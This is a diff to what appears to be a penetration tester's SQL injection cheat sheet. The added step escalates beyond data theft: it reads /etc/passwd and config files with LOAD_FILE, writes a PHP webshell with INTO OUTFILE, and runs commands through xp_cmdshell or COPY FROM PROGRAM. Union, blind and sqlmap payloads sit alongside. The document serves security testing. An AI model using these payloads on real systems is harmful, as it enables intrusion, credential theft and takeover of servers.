@@ -36,7 +36,13 @@ leak data one bit at a time via truthy/falsy responses or timing.
      `UNION SELECT NULL,version(),NULL-- -` and pull `information_schema`.
    - **Boolean-blind**: `AND SUBSTRING((SELECT ...),1,1)='a'` — automate the oracle.
    - **Time-blind**: `AND SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'` when no visible diff.
-3. **Automate** once confirmed: `sqlmap -r req.txt --batch --level 3 --risk 2 --dbms=mysql`
+3. **Escalate beyond data** where the DB privileges allow:
+   - **File read** (MySQL `FILE` priv): `UNION SELECT LOAD_FILE('/etc/passwd')` — read app source,
+     keys, config to find the next bug.
+   - **File write → webshell**: `... INTO OUTFILE '/var/www/html/s.php'` (needs `FILE`, a writable
+     path, and `secure_file_priv` unset). MSSQL `xp_cmdshell` / Postgres `COPY ... FROM PROGRAM`
+     give direct command execution when you're DBA.
+4. **Automate** once confirmed: `sqlmap -r req.txt --batch --level 3 --risk 2 --dbms=mysql`
    (`-r` = saved Burp request preserves auth/headers; raise level/risk only after manual proof).
 
 ## Gotchas
